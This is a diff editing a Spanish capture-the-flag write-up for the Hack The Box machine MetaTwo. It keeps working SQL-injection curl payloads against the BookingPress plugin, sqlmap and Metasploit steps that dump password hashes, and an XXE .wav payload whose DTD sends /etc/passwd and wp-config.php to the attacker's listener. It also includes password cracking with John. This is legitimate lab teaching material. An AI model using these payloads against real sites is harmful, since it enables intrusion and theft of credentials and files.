@@ -15,25 +15,28 @@ tags:
   - Linux
   - Virtual Hosting
   - Web Enumeration
-  - Bookingpress 1.0.10
-  - Unauthenticated SQL Injection - USI
-  - USI - CVE-2022-0739
-  - Cracking Credentials
-  - WordPress 5.6.2
+  - Bookingpress
+  - Fuzzing
+  - Unauthenticated SQL Injection (USI)
+  - CVE-2022-0739 (USI)
+  - Cracking Hash
+  - WordPress
   - Authenticated XXE
-  - CVE-2021-29447
-  - John The Ripper
+  - CVE-2021-29447 (Authenticated XXE)
   - FTP Enumeration
   - SSH Enumeration
   - Passpie
-  - Abusing Passpie Credentials
+  - Cracking SSH Key
+  - Privesc - Abusing Passpie Credentials
   - OSCP Style
   - Metasploit Framework
 ---
 ![](/assets/images/htb-writeup-metatwo/metatwo_logo.png)
+
 Una máquina bastante complicada, otra que debería ser nivel medio, más no fácil. Usaremos el **servicio HTTP** para poder encontrar una forma de ganar acceso a la máquina, siendo que el código fuente nos ayudara a encontrar un plugin llamado **Bookingpress**, con el cual nos apoyaremos para capturar una petición usando **curl** y mandándola a **BurpSuite**, para después poder enumerar la base de datos de la página con **sqlmap**, capturando las credenciales en forma de **hashes**. Una vez las descifremos, entraremos al login del **WordPress** y en base a la versión, vamos a usar el Exploit **CVE-2021-29447** para cargar un Payload en formato **.wav** para que con **PHP** podamos descifrar las credenciales del servicio **FTP** que tiene la máquina. Adentro del **FTP** encontraremos las credenciales para el servicio **SSH**, nos logueamos como usuario y después de investigar que hay dentro de este servicio, usaremos **Passpie** para poder exportar la contraseña del **Root**.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *wappalizer*
 * *wpscane*
@@ -44,7 +47,8 @@ Herramientas utilizadas:
 * *searchsploit*
 * *sqlmap*
 * *burpsuite*
-* *msfconsole*
+* *metasploit framework(msfconsole)*
+* *Módulo: auxiliary/gather/wp_bookingpress_category_services_sqli*
 * *johntheripper*
 * *hashcat*
 * *python3*
@@ -101,10 +105,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -217,10 +218,7 @@ OJO, vemos que la página web usa el **servicio Nginx**, esto quizá nos sirva d
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -263,7 +261,7 @@ La página principal nos menciona que podemos agendar una cita para un **Evento*
 
 ![](/assets/images/htb-writeup-metatwo/Captura9.png)
 
-No pues no, de ahí en fuera, no veo nada que nos pueda ayudar. Antes de aplicar un **Fuzzing**, veamos que es lo que nos puede dar la herramienta **WPSCan** pues ya vimos que esta usando WordPress, quiza encuentre algo útil.
+No pues no, de ahí en fuera, no veo nada que nos pueda ayudar. Antes de aplicar un **Fuzzing**, veamos que es lo que nos puede dar la herramienta **WPScan** pues ya vimos que esta usando **WordPress**, quiza encuentre algo útil.
 
 <h2 id="WPScan">Usando Herramienta WPScan</h2>
 
@@ -366,6 +364,7 @@ Interesting Finding(s):
 [+] Memory used: 275.09 MB
 [+] Elapsed time: 00:00:32
 ```
+
 De momento no encontro nada que nos pueda ser de mucha utilidad y que no hayamos visto ya, por ejemplo, la versión del **WordPress** y **PHP** nos la dio el **Wappalizer**. Pero, podemos utilizar esta herramienta de una forma un poco más activa y agresiva, vamos a dejarla en segundo plano.
 ```bash
 wpscan --url http://metapress.htb --detection-mode aggressive --plugins-detection aggressive
@@ -444,19 +443,6 @@ Total requests: 220560
 ID           Response   Lines    Word       Chars       Payload                                                               
 =====================================================================
 
-000000001:   200        155 L    552 W      10342 Ch    "# directory-list-2.3-medium.txt"                                     
-000000003:   200        155 L    552 W      10342 Ch    "# Copyright 2007 James Fisher"                                       
-000000007:   200        155 L    552 W      10342 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"     
-000000013:   200        155 L    552 W      10342 Ch    "#"                                                                   
-000000012:   200        155 L    552 W      10342 Ch    "# on atleast 2 different hosts"                                      
-000000011:   200        155 L    552 W      10342 Ch    "# Priority ordered case sensative list, where entries were found"    
-000000010:   200        155 L    552 W      10342 Ch    "#"                                                                   
-000000009:   200        155 L    552 W      10342 Ch    "# Suite 300, San Francisco, California, 94105, USA."                 
-000000006:   200        155 L    552 W      10342 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"       
-000000008:   200        155 L    552 W      10342 Ch    "# or send a letter to Creative Commons, 171 Second Street,"          
-000000005:   200        155 L    552 W      10342 Ch    "# This work is licensed under the Creative Commons"                  
-000000002:   200        155 L    552 W      10342 Ch    "#"                                                                   
-000000004:   200        155 L    552 W      10342 Ch    "#"                                                                   
 000000126:   200        50 L     114 W      1763 Ch     "feed"                                                                
 000000124:   200        155 L    552 W      10342 Ch    "0"                                                                   
 000000062:   200        1033 L   3343 W     74116 Ch    "events"                                                              
@@ -486,7 +472,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 <br>
 
-Mmmmmm, saca muchas cosas que no veo útiles de momento, hagamos otro **Fuzzing** enfocado a **PHP**:
+Saca muchas cosas que no veo útiles de momento, hagamos otro **Fuzzing** enfocado a **PHP**:
 ```bash
 wfuzz -L -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://metapress.htb/FUZZ.php/
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -501,19 +487,6 @@ Total requests: 220560
 ID           Response   Lines    Word       Chars       Payload                                                               
 =====================================================================
 
-000000001:   200        155 L    552 W      10342 Ch    "# directory-list-2.3-medium.txt"                                     
-000000003:   200        155 L    552 W      10342 Ch    "# Copyright 2007 James Fisher"                                       
-000000007:   200        155 L    552 W      10342 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"     
-000000013:   200        155 L    552 W      10342 Ch    "#"                                                                   
-000000012:   200        155 L    552 W      10342 Ch    "# on atleast 2 different hosts"                                      
-000000010:   200        155 L    552 W      10342 Ch    "#"                                                                   
-000000011:   200        155 L    552 W      10342 Ch    "# Priority ordered case sensative list, where entries were found"    
-000000009:   200        155 L    552 W      10342 Ch    "# Suite 300, San Francisco, California, 94105, USA."                 
-000000006:   200        155 L    552 W      10342 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"       
-000000008:   200        155 L    552 W      10342 Ch    "# or send a letter to Creative Commons, 171 Second Street,"          
-000000005:   200        155 L    552 W      10342 Ch    "# This work is licensed under the Creative Commons"                  
-000000002:   200        155 L    552 W      10342 Ch    "#"                                                                   
-000000004:   200        155 L    552 W      10342 Ch    "#"                                                                   
 000000015:   200        155 L    552 W      10342 Ch    "index"                                                               
 000000475:   200        96 L     429 W      6931 Ch     "wp-login"                                                            
 000000978:   200        98 L     441 W      7073 Ch     "wp-register"                                                         
@@ -530,7 +503,7 @@ ID           Response   Lines    Word       Chars       Payload
 ...
 ```
 
-Ahora, probemos con Gobuster:
+Ahora probemos con **gobuster**:
 ```bash
 gobuster dir -u http://metapress.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php | grep '.php'
 [+] Extensions:              php
@@ -607,9 +580,9 @@ Vemos que es el servicio **Bookingpress 1.0.10**, busquemos un Exploit.
 <h3 id="Fuente2">Buscando un Exploit para Bookingpress</h3>
 
 Aquí hay algo:
-* https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
+* <a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357" target="_blank">BookingPress < 1.0.11 - Unauthenticated SQL Injection</a>
 
-Esta es una vulnerabilidad de este puglin de **WordPress** con la que, por lo que entiendo, va a capturar información de la base de datos de SQL, es decir, que vamos a hacer **SQL Injection**.
+Esta es una vulnerabilidad de este puglin de **WordPress** con la que, por lo que entiendo, va a capturar información de la **base de datos de SQL**, es decir, que vamos a hacer **SQL Injection**.
 
 Vamos a usar la herramienta **curl** con el ejemplo que nos pone el blog, ahí usaremos una función llamada **_wpnonce=** que viene en la página de la que sacamos el plugin **Bookingpress**.
 
@@ -621,7 +594,7 @@ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpre
 ```
 
 Lo activamos y nos tiene que mandar lo siguiente:
-```bash
+```json
 curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=948dbceb26&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' 
 HTTP/1.1 200 OK
 Server: nginx/1.18.0
@@ -641,7 +614,7 @@ Referrer-Policy: strict-origin-when-cross-origin
 ```
 
 Vamos a modificarlo un poco para que se vea mejor la información que se obtuvo de este **curl**, esto eliminando las cabeceras y quedaría así:
-```bash
+```json
 curl -s -q 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3aae7c8d8b&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' | jq .
 [
   {
@@ -667,10 +640,7 @@ Muy bien, si observamos bien el resultado, nos ha dado algo de información como
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -683,6 +653,7 @@ Muy bien, si observamos bien el resultado, nos ha dado algo de información como
 ```bash
 curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=948dbceb26&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x http://127.0.0.1:8080/
 ```
+
 * Lo activamos y ya nos debería dar un resultado en **BurpSuite**, lo mandamos al **Repeater** y así se debería ver:
 
 ![](/assets/images/htb-writeup-metatwo/Captura12.png)
@@ -699,10 +670,11 @@ nano admin.req
 ```
 
 Muy bien, ahora usemos la herramienta **sqlmap**. Aquí te dejo unos links con información básica sobre esta herramienta:
-* https://backtrackacademy.com/articulo/ataque-de-una-base-de-datos-con-sqlmap
-* https://keepcoding.io/blog/como-usar-sqlmap/
+* <a href="https://backtrackacademy.com/articulo/ataque-de-una-base-de-datos-con-sqlmap" target="_blank">Ataque de una Base de Datos con SQLMap</a>
+* <a href="https://keepcoding.io/blog/como-usar-sqlmap/" target="_blank">Cómo usar SQLmap</a>
 
 Ahora hagamos por pasos la captura:
+
 * Con el siguiente comando de **sqlmap** vamos a averiguar las bases de datos que existen en la página web, a todo dale que si:
 ```bash
 sqlmap -r admin.req -p total_service --dbs
@@ -795,7 +767,11 @@ Database: blog
 
 * Veamos que hay en la tabla **wp-users**. 
 
-**CUIDADO**, cuando te pida usar **common password suffixes?**, dile que no porque si no se tardara mucho en sacar el resultado, a lo demás dale que si:
+-------
+**CUIDADO**: cuando te pregunte **common password suffixes?**, dile que **No** porque si no se tardara mucho en sacar el resultado, a lo demás dale que **Si**:
+
+-------
+
 ```bash
 sqlmap -r admin.req -p total_service -D blog -T wp_users --dump
         ___
@@ -829,17 +805,17 @@ Excelente, tenemos dos hashes que podemos descifrar y dos usuarios.
 Como bien sabemos, se esta ocupando **WordPress** para realizar la página web de la máquina víctima, entonces podemos buscar cuales son las tablas por defecto que tiene WordPress, esto para encontrar la tabla que contenga a los usuarios y contraseñas para entrar en su login, busquemos.
 
 Aquí podemos encontrar las columnas que almacena la tabla **wp_users**, pues en esta tabla se encuentran los usuarios y contraseñas:
-* https://usersinsights.com/wordpress-user-database-tables/
+* <a href="https://usersinsights.com/wordpress-user-database-tables/" target="_blank">How WordPress user data is stored in the database</a>
 
 Ahora bien, vamos a tratar de dumpear las mismas credenciales que ya obtuvimos con **SQLMAP**, por lo que entiendo en la **inyección SQL**, son necesarios 3 parámetros para que funcione, siendo estos:
-* @@version
-* @@version_comment
-* @@version_compile_os,1,2,3,4,5,6
+* *@@version*
+* *@@version_comment*
+* *@@version_compile_os,1,2,3,4,5,6*
 
 Quiero creer que podemos cambiarlos y meter la tabla **wp_users** para dumpear las credenciales, vamos a probarlo.
 
 * Cambia el primer parámetro por cualquiera de la tabla **wp_users** y enfoca la query hacia la tabla **wp_users**:
-```bash
+```json
 curl -s -q 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3aae7c8d8b&category_id=33&total_service=-7502) UNION ALL SELECT user_login,@@version_comment,@@version_compile_os,1,2,3,4,5,6 from wp_users-- -' | jq .
 [
   {
@@ -872,7 +848,7 @@ curl -s -q 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=booking
 ```
 
 Muy bien, podemos ver los usuarios que tiene registrado el **WordPress**, vamos a ver si podemos conseguir las contraseñas:
-```bash
+```json
 curl -s -q 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3aae7c8d8b&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_pass,@@version_compile_os,1,2,3,4,5,6 from wp_users-- -' | jq .
 [
   {
@@ -903,19 +879,21 @@ curl -s -q 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=booking
   }
 ]
 ```
-Excelente, podemos ver que esta es otra forma de obtener las credenciles.
+Excelente, podemos ver que esta es otra forma de obtener las credenciales.
 
 
 <h2 id="SQL3">Obteniendo Credenciales con Módulo de Metasploit</h2>
 
-Dentro de **Metasploit**, existe un módulo que nos automatiza la **inyección SQL**, veamos que resultado obtenemos utilizando dicho módulo. Vamos por pasos:
+Dentro de **Metasploit**, existe un módulo que nos automatiza la **inyección SQL**, veamos que resultado obtenemos utilizando dicho módulo. 
+
+Vamos por pasos:
 
 * Abre **Metasploit**:
 ```bash
 msfconsole
 ```
 
-* Busca el módulo de bookingpress:
+* Busca el módulo de **bookingpress**:
 ```bash
 msf6 > search bookingpress
 *
@@ -932,7 +910,7 @@ msf6 > use 0
 msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) >
 ```
 
-* Configuralo con la IP/Host de la máquina víctima y cambia el TARGETURI por la página donde encontramos el uso de bookingpress:
+* Configuralo con la IP/Host de la máquina víctima y cambia el **TARGETURI** por la página donde encontramos el uso de **bookingpress**:
 ```bash
 msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set RHOSTS metapress.htb
 RHOSTS => metapress.htb
@@ -963,7 +941,7 @@ Y listo, ya tenemos otra forma de obtener los hashes de las credenciales.
 <h2 id="Hash">Descifrando Hashes</h2>
 
 Para descifrar los hashes vamos a usar la herramienta **John The Ripper**, al chile me da hueva explicarte como instalarla, así que te dejo un link:
-* https://www.kolibers.com/blog/hash_cracking_con_john_the_ripper.html
+* <a href="https://www.kolibers.com/blog/hash_cracking_con_john_the_ripper.html" target="_blank">Password Cracking con John The Ripper</a>
 
 Hagamos esto por pasos:
 
@@ -971,7 +949,8 @@ Hagamos esto por pasos:
 ```bash
 nano crackhash.txt
 ```
-* Ahora usemos **John** para que lo descifre a la fuerza, cuando tengas un resultado, cancela el comando:
+
+* Ahora usemos **John** para que lo descifre a la fuerza, cuando tengas un resultado cancela el comando:
 ```bash
 john -w=/usr/share/wordlists/rockyou.txt crackhash.txt 
 Using default input encoding: UTF-8
@@ -1035,36 +1014,38 @@ Mmmm veamos que nos dice **Wappalizer**:
 <img src="/assets/images/htb-writeup-metatwo/Captura16.png">
 </p>
 
-Nos dice la versión de WordPress que es la 5.6.2, busquemos un Exploit para este. 
+Nos dice la versión de **WordPress** que es la **versión 5.6.2**, busquemos un Exploit para este. 
 
 Encontré este:
-* https://github.com/motikan2010/CVE-2021-29447
+* <a href="https://github.com/motikan2010/CVE-2021-29447" target="_blank">Repositorio de motikan2010: WordPress 5.6-5.7 - Authenticated (Author+) XXE (CVE-2021-29447)</a>
 
 Lo que debemos hacer, será cargar un Payload en formato **.wav** para que nos regrese una Shell. Esto fue bastante complicado de encontrar, pero aquí hay una forma de usar este Exploit:
-* https://tryhackme.com/room/wordpresscve202129447
+* <a href="https://tryhackme.com/room/wordpresscve202129447" target="_blank">Wordpress: CVE-2021-29447</a>
 
 Entonces, vamos a hacer lo mismo que este blog, ya sabes por pasos:
+
 * Creamos el Payload con nuestra IP y un puerto:
 ```bash
 echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://TU_IP:Un_Puerto/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
 ```
 
 * Creamos un archivo con el nombre **NAMEEVIL.dtd** y le metemos un Payload que será como él escucha:
-```
+```html
 <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../etc/passwd">
 <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://Tu_IP:Un_Puerto/?p=%file;'>" >
 ```
 
-* Abrimos un servidor en Python en donde estén el Payload y el otro archivo, OJO, debe ser abierto en el mismo puerto que pusiste en él ambos archivos:
+* Abrimos un servidor en **Python** en donde estén el Payload y el otro archivo, OJO, debe ser abierto en el mismo puerto que pusiste en él ambos archivos:
 ```bash
 python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
+
 * Cargamos el Payload **.wav** a la página:
 
 ![](/assets/images/htb-writeup-metatwo/Captura17.png)
 
-* Deberíamos tener una respuesta en el servidor de Python:
+* Deberíamos tener una respuesta en el servidor de **Python**:
 ```bash
 python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
@@ -1075,24 +1056,24 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 * En otra terminal abrimos **PHP**:
-```
+```php
 php -a                
 Interactive shell
 php >
 ```
 
 * Copiamos el siguiente comando:
-```bash
+```php
 php > echo zlib_decode(base64_decode(''));
 ```
 
 * Adentro de las comillas simples, vamos a poner el segundo **GET** que obtuvimos en el servidor de Python desde la **jVVZU** hasta **/NW==**:
-```bash
+```php
 php > echo zlib_decode(base64_decode('jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw=='));
 ```
 
 * Activamos el comando y vemos el resultado:
-```bash
+```php
 php > echo zlib_decode(base64_decode('jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw=='));
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -1124,16 +1105,18 @@ mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
 proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
 ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
 ```
-¡Muy Bien! Ósea que podemos listar lo que queramos, pero existe un archivo en **WordPress** que almacena contraseñas y usuarios. Tratemos de listarla:
+¡Muy Bien! Ósea que podemos listar lo que queramos, pero existe un archivo en **WordPress** que almacena contraseñas y usuarios. 
+
+Tratemos de listarla:
 
 * Vamos a cambiar el directorio a listar en el archivo **NAMEEVIL.dld** y donde está el directorio **/etc/passwd** vamos a poner **/wp-config.php**:
-```
+```html
 <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../wp-config.php">
 <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.16:8000/?p=%file;'>" >
 ```
 
-* Y hacemos lo mismo que hicimos, abrimos (o cerramos y abrimos) un servidor en Python y cargamos el Payload **.wav** a la página. Copiamos el segundo **GET** en la terminal donde está activo el PHP, con el mismo comando **echo zlib_decode(base64_decode(''));**, lo activamos y deberíamos tener el siguiente resultado:
-```bash
+* Y hacemos lo mismo que hicimos, abrimos (o cerramos y abrimos) un servidor en **Python** y cargamos el Payload **.wav** a la página. Copiamos el segundo **GET** en la terminal donde está activo el **PHP**, con el mismo comando **echo zlib_decode(base64_decode(''));**, lo activamos y deberíamos tener el siguiente resultado:
+```php
 php > echo zlib_decode(base64_decode('jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw=='));
 <?php
 /** The name of the database for WordPress */
@@ -1156,12 +1139,12 @@ define( 'FTP_BASE', 'blog/' );
 define( 'FTP_SSL', false );
 ...
 ```
-¡Excelente! Tenemos la contraseña y usuario del servicio FTP, entremos ahí y veamos qué hay.
+¡Excelente! Tenemos la contraseña y usuario del **servicio FTP**, entremos ahí y veamos qué hay.
 
 <h2 id="FTP">Enumeración Servicio FTP</h2>
 
 Entremos:
-```bash
+```batch
 ftp 10.10.11.186
 Connected to 10.10.11.186.
 220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
@@ -1182,7 +1165,7 @@ drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer
 ```
 
 Hay dos directorios, pero el de **mailer** es el que nos interesa, entremos ahí:
-```bash
+```batch
 ftp> cd mailer
 250 CWD command successful
 ftp> ls -la
@@ -1196,7 +1179,7 @@ drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5  2022 PHPMailer
 ```
 
 Vamos a descargar y a ver ese archivo llamado **send_email.php**:
-```bash
+```batch
 ftp> get send_email.php
 local: send_email.php remote: send_email.php
 229 Entering Extended Passive Mode (|||62755|)
@@ -1209,7 +1192,7 @@ ftp> exit
 ```
 
 Veamos el contenido de este archivo:
-```bash
+```php
 cat get_oauth_token.php 
 <?php
 /*
@@ -1253,7 +1236,7 @@ try {
     echo "Mailer Error: " . $mail->ErrorInfo;
 }
 ```
-Excelente, tenemos las credenciales para entrar al servicio **SSH**.
+Excelente, tenemos las credenciales para entrar al **servicio SSH**.
 
 <h2 id="SSH">Entrando al Servicio SSH</h2>
 
@@ -1290,19 +1273,17 @@ dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie
 -rw-r----- 1 root    jnelson   33 Apr 14 18:22 user.txt
 jnelson@meta2:~$ cat user.txt
 ```
-Muy bien, es hora de convertirnos en Root.
+Muy bien, es hora de convertirnos en **Root**.
 
 
 <br>
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
+
 
 <h2 id="Enum">Enumeración de la Máquina Víctima</h2>
 
@@ -1384,7 +1365,8 @@ Veo una llave privada, vamos a descifrarla, para hacerlo usaremos otra vez **Joh
 
 <h2 id="CrackPass">Crackeando Llave de Passpie</h2>
 
-así que hagámoslo por pasos:
+Así que hagámoslo por pasos:
+
 * Copiemos la llave privada en un archivo:
 ```bash
 nano privkey.txt
@@ -1401,6 +1383,7 @@ AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
 gpg2john privkey.txt > hash                          
 File privkey.txt
 ```
+
 * Por último desciframos el archivo:
 ```bash
 john -w=/usr/share/wordlists/rockyou.txt hash         
@@ -1415,9 +1398,9 @@ blink182         (Passpie)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
-Muy bien, tenemos la contraseña para **Passpie**. Pero ¿esto de qué nos sirve? Pues vamos a usar **Passpie** para cambiar o mostrar la contraseña del Root.
